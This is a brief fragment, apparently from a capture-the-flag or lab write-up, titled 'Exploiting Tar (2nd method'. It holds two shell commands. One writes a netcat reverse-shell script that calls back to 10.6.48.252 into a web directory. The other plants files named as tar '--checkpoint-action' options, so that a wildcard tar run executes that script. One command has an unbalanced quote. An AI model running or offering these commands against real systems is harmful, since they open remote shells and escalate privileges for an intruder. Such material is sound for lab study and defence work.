- - -
## Exploiting Tar ( 2nd method   : 

```sh
printf 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.6.48.252 4545 >/tmp/f' > /var/www/html/shell.sh ; chmod +x /var/www/html/shell.sh
```


```sh
touch "/var/www/html/--checkpoint=1" ; touch /var/www/html/--checkpoint-action=exec=bash\ shell.sh"
```


- - -

